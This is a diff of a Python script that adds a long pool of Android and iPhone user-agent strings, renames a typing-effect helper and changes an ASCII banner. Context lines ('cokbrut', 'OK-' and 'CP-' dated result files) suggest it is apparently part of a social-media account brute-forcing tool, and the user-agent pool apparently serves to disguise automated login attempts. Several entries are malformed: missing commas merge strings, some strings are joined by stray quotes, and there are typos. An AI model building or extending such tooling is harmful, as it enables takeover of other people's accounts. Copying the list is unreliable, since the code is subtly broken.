@@ -33,7 +33,110 @@ except ImportError:
 pretty.install()
 CON=sol()
 ugen2=[]
-ugen=[]
+ugen=['Mozilla/5.0 (Linux; Android 6.0.1; SM-G610M Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (23/6.0.1; 480dpi; 1080x1920; samsung; SM-G610M; on7xelte; samsungexynos7870; pt_BR; 103516666','Mozilla/5.0 (Linux; Android 7.0; SM-J530FM Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 320dpi; 720x1280; samsung; SM-J530FM; j5y17lte; samsungexynos7870; ru_RU; 104766893', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C153 Instagram 41.0.0.14.90 (iPhone7,2; iOS 11_2_1; en_UA; en-UA; scale=2.00; gamut=normal; 750x1334)', 
+'Mozilla/5.0 (Linux; Android 5.1; M3s Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 Instagram 40.0.0.14.95 Android (22/5.1; 320dpi; 720x1280; Meizu; M3s; M3s; mt6755; uk_UA; 102221279)', 
+'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1713 Build/L860X) NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4210.57 Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/5.7.0.7'
+'Mozilla/5.0 (Linux; Android 12; SM-S901U) AppleWetbKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Mobile Safari/537.36 EdgA/101.0.1210.53'
+'Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G925F; zerolte; samsungexynos7420; ru_RU; 104766900)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 Instagram 43.0.0.13.91 (iPhone5,1; iOS 10_3_3; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x1136)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 41.0.0.14.90 (iPhone8,2; iOS 11_3; de_DE; de-DE; scale=2.88; gamut=normal; 1080x1920)', 
+'Mozilla/5.0 (Linux; Android 6.0; EVA-L09 Build/HUAWEIEVA-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (23/6.0; 480dpi; 1794x1080; HUAWEI; EVA-L09; HWEVA; hi3650; uk_UA; 104766900)', 
+'Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (26/8.0.0; 640dpi; 1440x2768; samsung; SM-G950F; dreamlte; samsungexynos8895; ru_RU; 104766900)', 
+'Mozilla/5.0 (Linux; Android 6.0.1; SM-J500H Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 40.0.0.14.95 Android (23/6.0.1; 320dpi; 1280x720; samsung; SM-J500H; j53g; qcom; en_GB; 102221278)', 
+'Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (22/5.1; 480dpi; 1080x1920; Meizu; m3 note; m3note; mt6755; ru_RU; 103516666)', 
+'Mozilla/5.0 (Linux; Android 5.1.1; SM-T331 Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Safari/537.36 Instagram 42.0.0.19.95 Android (22/5.1.1; 213dpi; 1280x800; samsung; SM-T331; millet3g; qcom; ru_RU; 104766888)', 
+'Mozilla/5.0 (Linux; Android 5.1.1; Redmi 3 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36 Instagram 27.0.0.11.97 Android (22/5.1.1; 320dpi; 720x1280; Xiaomi; Redmi 3; ido; qcom; ru_RU)', 
+'Mozilla/5.0 (Linux; Android 7.0; Lenovo P2a42 Build/NRD90N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 39.0.0.19.93 Android (24/7.0; 480dpi; 1080x1776; LENOVO/Lenovo; Lenovo P2a42; P2a42; qcom; uk_UA; 100986894)', 
+'Mozilla/5.0 (Linux; Android 4.4.2; Lenovo S660 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (19/4.4.2; 240dpi; 540x960; Lenovo; Lenovo S660; S660; mt6582; ru_RU; 103516653)', 
+'Mozilla/5.0 (Linux; Android 6.0; MX6 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 Instagram 41.0.0.13.92 Android (23/6.0; 480dpi; 1080x1920; Meizu; MX6; MX6; mt6797; ru_RU; 103516666)', 
+'Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-A520F; a5y17lte; samsungexynos7880; ru_RU; 104766900)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 41.0.0.14.90 (iPhone9,3; iOS 11_3; ru_UA; ru-UA; scale=2.00; gamut=wide; 750x1334)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 41.0.0.14.90 (iPhone8,1; iOS 11_3; ru_UA; ru-UA; scale=2.00; gamut=normal; 750x1334)', 
+'Mozilla/5.0 (Linux; Android 4.4.4; E2115 Build/24.0.B.5.14) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (19/4.4.4; 240dpi; 540x904; Sony; E2115; E2115; mt6582; ru_RU; 104766888)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 Instagram 41.0.0.14.90 (iPhone6,1; iOS 11_2_5; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x1136)', 
+'Mozilla/5.0 (Linux; Android 5.1; HUAWEI TIT-U02 Build/HUAWEITIT-U02; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (22/5.1; 320dpi; 720x1184; HUAWEI; HUAWEI TIT-U02; HWTIT-U6582; mt6582; ru_RU; 104766893)', 
+'Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 43.0.0.10.97 Android (26/8.0.0; 640dpi; 1440x2768; samsung; SM-G950F; dreamlte; samsungexynos8895; uk_UA; 105842053)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 43.0.0.13.91 (iPhone10,6; iOS 11_3; ru_DE; ru-DE; scale=3.00; gamut=wide; 1125x2436)', 
+'Mozilla/5.0 (Linux; Android 7.0; SM-C7000 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 420dpi; 1080x1920; samsung; SM-C7000; c7ltechn; qcom; uk_UA; 104766900)', 
+'Mozilla/5.0 (Linux; Android 7.0; SLA-L22 Build/HUAWEISLA-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 320dpi; 720x1208; HUAWEI; SLA-L22; HWSLA-Q; qcom; ru_UA; 104766893)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 43.0.0.13.91 (iPhone9,4; iOS 11_3; ru_UA; ru-UA; scale=2.61; gamut=wide; 1080x1920)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 40.0.0.9.95 (iPhone8,1; iOS 11_3; ru_UA; ru-UA; scale=2.00; gamut=normal; 750x1334)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 43.0.0.13.91 (iPhone8,1; iOS 11_3; de_DE; de-DE; scale=2.00; gamut=normal; 750x1334)', 
+'Mozilla/5.0 (Linux; Android 7.0; SM-A520F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-A520F; a5y17lte; samsungexynos7880; uk_UA; 104766900)', 
+'Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500 Build/LRX22C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 Instagram 33.0.0.11.92 Android (21/5.0.1; 480dpi; 1080x1920; samsung; GT-I9500; ja3g; universal5410; en_US; 93117670)', 
+'Mozilla/5.0 (Linux; Android 8.0.0; HTC U11 Build/OPR6.170623.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (26/8.0.0; 408dpi; 1080x1920; HTC/htc; HTC U11; htc_ocndugl; htc_ocn; ru_RU; 104766900)', 
+'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (25/7.1.2; 320dpi; 720x1280; Xiaomi; Redmi 4A; rolex; qcom; ru_RU; 104766893)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 Instagram 43.0.0.13.91 (iPhone9,1; iOS 10_3_3; ru_UA; ru; scale=2.00; gamut=wide; 750x1334)', 
+'Mozilla/5.0 (Linux; Android 7.0; Moto G (4) Build/NPJS25.93-14-8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 480dpi; 1080x1776; motorola; Moto G (4); athene; qcom; ru_RU; 104766900)', 
+'Mozilla/5.0 (Linux; Android 6.0; U10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 Instagram 40.0.0.14.95 Android (23/6.0; 320dpi; 720x1280; Meizu; U10; U10; mt6755; en_US; 102221279)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E302 Instagram 43.0.0.13.91 (iPhone8,2; iOS 11_3_1; ru_UA; ru-UA; scale=2.88; gamut=normal; 1080x1920)', 
+'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Lenovo S660 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 42.0.0.19.95 Android (17/4.2.2; 240dpi; 540x960; Lenovo; Lenovo S660; S660; mt6582; ru_RU; 104766888)', 
+'Mozilla/5.0 (Linux; U; Android 4.1.2; ru-ru; Lenovo A706_ROW Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 43.0.0.10.97 Android (16/4.1.2; 240dpi; 854x480; LENOVO/Lenovo; Lenovo A706_ROW; armani_row; qcom; ru_RU; 105842050)', 
+'Mozilla/5.0 (Linux; Android 6.0; Lenovo A7010a48 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (23/6.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo A7010a48; A7010a48; mt6735; uk_UA; 104766900)', 
+'Mozilla/5.0 (Linux; Android 7.0; SM-A510F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-A510F; a5xelte; samsungexynos7580; ru_RU; 104766900)', 
+'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 43.0.0.10.97 Android (25/7.1.2; 440dpi; 1080x2030; Xiaomi/xiaomi; Redmi 5 Plus; vince; qcom; ru_RU; 105842053)', 
+'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320H Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (22/5.1.1; 320dpi; 720x1280; samsung; SM-J320H; j3x3g; sc8830; ru_RU; 104766893)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 Instagram 38.0.0.7.96 (iPhone7,2; iOS 10_3_2; uk_UA; uk-UA; scale=2.00; gamut=normal; 750x1334)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 Instagram 41.0.0.14.90 (iPhone8,1; iOS 10_2_1; ru_UA; ru-UA; scale=2.00; gamut=normal; 750x1334)', 
+'Mozilla/5.0 (Linux; Android 7.0; SM-G920F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G920F; zeroflte; samsungexynos7420; ru_RU; 104766900)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 33.0.0.11.96 (iPhone8,4; iOS 11_3; ru_UA; ru-UA; scale=2.00; gamut=normal; 640x1136)', 
+'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 43.0.0.10.97 Android (25/7.1.2; 320dpi; 720x1280; Xiaomi; Redmi 5A; riva; qcom; uk_UA; 105842051)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 Instagram 43.0.0.13.91 (iPhone8,1; iOS 11_3; ru_UA; ru-UA; scale=2.00; gamut=normal; 750x1334)', 
+'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E302 Instagram 43.0.0.13.91 (iPhone10,3; iOS 11_3_1; ru_UA; ru-UA; scale=3.00; gamut=wide; 1125x2436)', 
+'Mozilla/5.0 (Linux; Android 5.1; m2 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 Instagram 40.0.0.14.95 Android (22/5.1; 320dpi; 720x1280; Meizu; m2; m2; mt6735; uk_UA; 102221279)', 
+'Mozilla/5.0 (Linux; Android 7.0; SM-J730FM Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 420dpi; 1080x1920; samsung; SM-J730FM; j7y17lte; samsungexynos7870; ru_RU; 104766900)', 
+'Mozilla/5.0 (Linux; Android 7.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 42.0.0.19.95 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-G935F; hero2lte; samsungexynos8890; ru_RU; 104766900)',
+'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36',
+'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
+'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109',
+'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 
+'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
+'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)',
+'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 11; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/9.0.3.2', 
+'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 
+'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5', 
+'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 11; RMX3263) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+'Mozilla/5.0 (X11; 10; Linux x86_64)E219Y)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.082.0.4655.104Safari/537.36',
+'Mozilla/5.0 (Linux; Android 11; V2110 Build/RP1A.200720.012_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/377.0.0.22.107;]',
+'Mozilla/5.0 (Linux; U; Android 11; en-in; Redmi Note 9 Pro Max Build/RKQ1.200826.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.10.7-gn',
+'Mozilla/5.0 (Linux; Android 11; V2110 Build/RP1A.200720.012_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/373.0.0.31.112;]',
+'Mozilla/5.0 (Linux; Android 12; V2110 Build/SP1A.210812.003_NONFC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]',
+'Mozilla/5.0 (Linux; Android 12; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]', 
+'Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-B724L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.4495.118 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; U; Android 8;  en-us; GT-D636K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.4391.69 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 11; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.147 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.11.4.2-gn',
+'Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 Build/OPD1.170811.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 10; Wildfire U20 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36', 
+'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19E241 Safari/602.1', 
+'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1', 
+'Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1', 
+'Mozilla/5.0 (Apple-iPhone7C2/1202.466; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3', 
+'Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 11; Lenovo YT-J706X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36', 
+'Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36',
+'Mozilla/5.0 (Linux; Android 9; Xperia X Compact) AppleWebKit/537.36 (KHTML, Gecko) Chrome/92.0.4515.166 Mobile Safari/537.36']
 cokbrut=[]
 ses=requests.Session()
 princp=[]
@@ -133,21 +236,25 @@ thn = datetime.datetime.now().year
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 #------------------[ MACHINE-SUPPORT ]---------------#
-def alvino_xy(u):
+def ilman(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
 def clear():
 	os.system('clear')
 def back():
 	login()
-#------------------[ LOGO-LAKNAT ]-----------------#
+#------------------[ LOGO ]-----------------#
 def banner():
 	print(f'''\t{asu}
- ___   _       __  __      _      _   _
-|_ _| | |     |  \/  |    / \    | \ | |
- | |  | |     | |\/| |   / _ \   |  \| |
- | |  | |___  | |  | |  / ___ \  | |\  |
-|___| |_____| |_|  |_| /_/   \_\ |_| \_|
